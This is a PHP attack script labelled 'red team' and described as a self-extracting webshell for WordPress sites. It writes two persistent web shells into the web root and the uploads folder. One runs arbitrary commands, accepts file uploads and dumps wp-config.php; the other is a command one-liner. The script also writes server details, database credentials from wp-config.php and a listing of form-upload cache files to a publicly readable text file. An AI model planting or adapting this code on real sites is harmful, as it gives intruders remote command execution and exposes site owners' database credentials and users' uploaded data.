<?php
/**
 * Self-extracting webshell
 * Creates accessible endpoints when executed
 */

// Create a simple accessible endpoint in web root
$webroot = $_SERVER['DOCUMENT_ROOT'];
$endpoint_file = $webroot . '/redteam_access.php';

$endpoint_code = '<?php
// RED TEAM ACCESS ENDPOINT
header("Content-Type: text/plain");
error_reporting(0);

if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
    exit;
}

if(isset($_POST["upload"])) {
    $target = basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target);
    echo "Uploaded: $target";
    exit;
}

if(isset($_GET["config"])) {
    // Try to read wp-config.php
    $config_paths = [
        $webroot . "/wp-config.php",
        dirname($webroot) . "/wp-config.php",
        "/var/www/html/wp-config.php",
        "/var/www/wp-config.php",
    ];
    
    foreach($config_paths as $path) {
        if(file_exists($path)) {
            echo file_get_contents($path);
            exit;
        }
    }
    echo "wp-config.php not found";
    exit;
}

echo "RED TEAM ACCESS POINT\n";
echo "Available commands:\n";
echo "  ?cmd=id - Execute command\n";
echo "  ?config=1 - Get wp-config.php\n";
echo "  POST upload=1 with file - Upload file\n";
?>';

// Write the endpoint
file_put_contents($endpoint_file, $endpoint_code);

// Also create a simpler one-liner in uploads directory (might be accessible)
$uploads_file = $webroot . '/wp-content/uploads/redteam_simple.php';
file_put_contents($uploads_file, '<?php if(isset($_GET["c"])){system($_GET["c"]);}?>');

// Try to extract data and store it somewhere accessible
$data_file = $webroot . '/wp-content/uploads/redteam_data.txt';

$data = "=== SYSTEM INFO ===\n";
$data .= "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
$data .= "PHP: " . phpversion() . "\n";
$data .= "User: " . exec('whoami') . "\n";
$data .= "PWD: " . exec('pwd') . "\n\n";

// Try to get database config
$config_paths = [
    $webroot . "/wp-config.php",
    dirname($webroot) . "/wp-config.php",
];

foreach($config_paths as $path) {
    if(file_exists($path)) {
        $data .= "=== WP-CONFIG.PHP ===\n";
        $data .= file_get_contents($path) . "\n";
        break;
    }
}

// List files in uploads directory
$uploads_dir = $webroot . '/wp-content/uploads/wpforms/cache/';
if(is_dir($uploads_dir)) {
    $data .= "=== UPLOADED FILES ===\n";
    $files = scandir($uploads_dir);
    foreach($files as $file) {
        if($file != '.' && $file != '..') {
            $data .= $file . " - " . filesize($uploads_dir . $file) . " bytes\n";
        }
    }
}

file_put_contents($data_file, $data);

// Output success message
echo "RED TEAM PAYLOAD EXECUTED\n";
echo "Endpoints created:\n";
echo "1. /redteam_access.php\n";
echo "2. /wp-content/uploads/redteam_simple.php\n";
echo "3. /wp-content/uploads/redteam_data.txt\n";
echo "\nCheck if these are accessible from web.\n";

// Also try to make a WordPress post with the data
// This would require WordPress functions to be loaded
?>
